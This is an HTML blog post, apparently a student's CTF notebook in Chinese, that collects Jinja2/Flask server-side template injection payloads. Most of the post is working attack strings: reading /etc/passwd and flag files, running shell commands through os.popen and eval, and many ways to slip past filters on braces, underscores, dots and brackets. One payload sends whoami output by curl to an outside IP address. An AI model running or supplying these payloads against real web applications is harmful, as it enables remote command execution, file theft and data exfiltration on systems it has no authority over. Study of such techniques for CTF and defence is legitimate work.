@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="看不懂payload只好记下来。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI模板注入">
+<meta property="og:url" content="http://example.com/2020/12/29/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="小川同学的blogs">
+<meta property="og:description" content="看不懂payload只好记下来。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-12-29T11:39:44.266Z">
+<meta property="article:modified_time" content="2020-12-30T11:02:16.561Z">
+<meta property="article:author" content="晚安">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2020/12/29/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SSTI模板注入 | 小川同学的blogs</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">小川同学的blogs</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">学习&生活</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/29/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/OIP.jpg">
+      <meta itemprop="name" content="晚安">
+      <meta itemprop="description" content="冲！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小川同学的blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSTI模板注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-29 19:39:44" itemprop="dateCreated datePublished" datetime="2020-12-29T19:39:44+08:00">2020-12-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-12-30 19:02:16" itemprop="dateModified" datetime="2020-12-30T19:02:16+08:00">2020-12-30</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>看不懂payload只好记下来。</p>
+<a id="more"></a>
+
+<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">  (<span class="string">&#x27;cat /fl4g|base64&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;  </span><br></pre></td></tr></table></figure>
+
+<h3 id="还有个新发现的新利用我也抄一下"><a href="#还有个新发现的新利用我也抄一下" class="headerlink" title="还有个新发现的新利用我也抄一下"></a>还有个新发现的新利用我也抄一下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h2 id="通用命令执行"><a href="#通用命令执行" class="headerlink" title="通用命令执行"></a>通用命令执行</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">      &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    	 &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      	 &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">   	   &#123;% endif %&#125;</span><br><span class="line">  	&#123;% endif %&#125;</span><br><span class="line">   &#123;% endfor %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="过滤-或-："><a href="#过滤-或-：" class="headerlink" title="过滤 { { 或 } } ："></a>过滤 { { 或 } } ：</h3><blockquote>
+<p>可以使用{加上一个%绕过。中间可以执行if语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://39.105.116.195:8080/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤__ :"></a>过滤__ :</h3><p>用编码绕过，比如</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如：__class__ =&gt; \x5f\x5fclass\x5f\x5f</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">_</span>是\x5f，.是\x2E</span><br><span class="line">过滤了<span class="symbol">_</span>可以用dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]或者request[<span class="string">&#x27;args&#x27;</span>]或者request[<span class="string">&#x27;values&#x27;</span>]绕过</span><br><span class="line">但是如果还过滤了 args所以我们用request[‘values’]和attr结合绕过</span><br><span class="line">例如<span class="string">&#x27;&#x27;</span>.<span class="symbol">__class__</span>写成 <span class="string">&#x27;&#x27;</span>|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>]),然后post传入x1=<span class="symbol">__class__</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤. :"></a>过滤. :</h3><p><code>.</code> 在payload中是很重要的，但是我们依旧可以采用<code>attr()</code>或<code>[]</code>绕过。</p>
+<p>正常版 :</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?name=&#123;&#123;().__class__.__base__.__subclasses__[177].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ipconfig&quot;).read()&#x27;)&#125;&#125;`</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>attr()</code>绕过 :</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">177</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>[]</code>绕过 :</p>
+<p>可以用<code>getitem()</code>用来获取序号</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?name=&#123;&#123; config[&#x27;__class__&#x27;][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ipconfig&#x27;)[&#x27;read&#x27;]() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其他 :</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__可以写成 <span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>)或者 ’<span class="string">&#x27;|attr(&quot;__class__&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤[ ] :"></a>过滤[ ] :</h3><p>可以用<code>getitem()</code>用来获取序号</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用请求方式requests绕过-："><a href="#利用请求方式requests绕过-：" class="headerlink" title="利用请求方式requests绕过 ："></a>利用请求方式requests绕过 ：</h3><ul>
+<li><p>如果对我们特定的参数进行了严格的过滤，我们就可以使用<code>request</code>来进行绕过，request可以获得请求的相关信息，我们拿过滤<code>__class__</code>，可以用<code>request.args.t1</code>且以GET方式提交<code>t1=__class__</code>来替换被过滤的<code>__class__</code>‘</p>
+<p>例</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request.args.t1]&#125;&#125;&amp;t1=__class__</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; =&gt; &#123;&#123;&#x27;&#x27;[request[&#x27;args&#x27;][&#x27;t1&#x27;]]&#125;&#125;&amp;t1=__class__</span><br></pre></td></tr></table></figure>
+
+<p>因为很重要再重复一遍！！！！<br>过滤了_可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者 <code>request[&#39;values&#39;]</code>绕过<br>但是如果还过滤了 args所以我们用request[‘values’]和attr结合绕过<br>例如<code>&#39;&#39;.__class__</code>写成 ‘<code>&#39;|attr(request[&#39;values&#39;][&#39;x1&#39;])</code>,然后post传入<code>x1=__class__</code></p>
+</li>
+</ul>
+<h3 id="绕过config参数"><a href="#绕过config参数" class="headerlink" title="绕过config参数 :"></a>绕过config参数 :</h3><p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag<br>但是如果被过滤了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference <span class="literal">None</span>&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他绕过姿势-来自P3师傅-删除了很多模块，但是没有删除reload"><a href="#其他绕过姿势-来自P3师傅-删除了很多模块，但是没有删除reload" class="headerlink" title="其他绕过姿势(来自P3师傅)   删除了很多模块，但是没有删除reload"></a>其他绕过姿势(来自P3师傅)   删除了很多模块，但是没有删除reload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtins__)，重新加载被删除的模块，直接命令执行，只用于py2  </span><br></pre></td></tr></table></figure>
+
+<h3 id="EASY前置"><a href="#EASY前置" class="headerlink" title="EASY前置 :"></a>EASY前置 :</h3><p>Flask在渲染模板的时候，有</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__===<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这一特性，把上下文变成了[]中的字符串，这个特性经常会被用来绕过点号的过滤。<br>由于里面的内容已经是字符串了，还可以做一个这样的变形</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__===<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>如果过滤了很多重要的参数呢？</p>
+<h3 id="python的格式化字符串特性"><a href="#python的格式化字符串特性" class="headerlink" title="python的格式化字符串特性 :"></a>python的格式化字符串特性 :</h3><p>因为python的字符串格式化允许指定ascii码为字符<br>如果放到flask里，就可以改写成<br><code>&quot;&#123;0:c&#125;&quot;[&#39;format&#39;](97)</code>  那么<code>__class__</code>就可以变成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">95</span>)%2<span class="string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">95</span>)%2<span class="string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">99</span>)%2<span class="string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">108</span>)%2<span class="string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">97</span>)%2<span class="string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">115</span>)%2<span class="string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">115</span>)%2<span class="string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">95</span>)%2<span class="string">b&#x27;&#123;0:c&#125;&#x27;</span>[<span class="string">&#x27;format&#x27;</span>](<span class="number">95</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意：+号要编码</p>
+
+    </div>
+
+    
+    
+    
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------结束啦!<i class="fa fa-paw"></i>感谢阅读!-------------</div>
+    
+</div>
+
+      
+    </div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAwp/" rel="prev" title="攻防世界web进阶区简记">
+      <i class="fa fa-chevron-left"></i> 攻防世界web进阶区简记
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python3"><span class="nav-text">python3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python2"><span class="nav-text">python2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%98%E6%9C%89%E4%B8%AA%E6%96%B0%E5%8F%91%E7%8E%B0%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%E6%88%91%E4%B9%9F%E6%8A%84%E4%B8%80%E4%B8%8B"><span class="nav-text">还有个新发现的新利用我也抄一下</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">通用命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-text">绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-%E6%88%96-%EF%BC%9A"><span class="nav-text">过滤 { { 或 } } ：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-text">过滤__ :</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-1"><span class="nav-text">过滤. :</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-2"><span class="nav-text">过滤[ ] :</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8Frequests%E7%BB%95%E8%BF%87-%EF%BC%9A"><span class="nav-text">利用请求方式requests绕过 ：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87config%E5%8F%82%E6%95%B0"><span class="nav-text">绕过config参数 :</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF-%E6%9D%A5%E8%87%AAP3%E5%B8%88%E5%82%85-%E5%88%A0%E9%99%A4%E4%BA%86%E5%BE%88%E5%A4%9A%E6%A8%A1%E5%9D%97%EF%BC%8C%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E5%88%A0%E9%99%A4reload"><span class="nav-text">其他绕过姿势(来自P3师傅)   删除了很多模块，但是没有删除reload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EASY%E5%89%8D%E7%BD%AE"><span class="nav-text">EASY前置 :</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7"><span class="nav-text">python的格式化字符串特性 :</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="晚安"
+      src="/images/OIP.jpg">
+  <p class="site-author-name" itemprop="name">晚安</p>
+  <div class="site-description" itemprop="description">冲！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1507452902@qq.com" title="E-Mail → mailto:1507452902@qq.com" rel="noopener" target="_blank"><i class="fa fa-qq fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="晚安"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">晚安</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
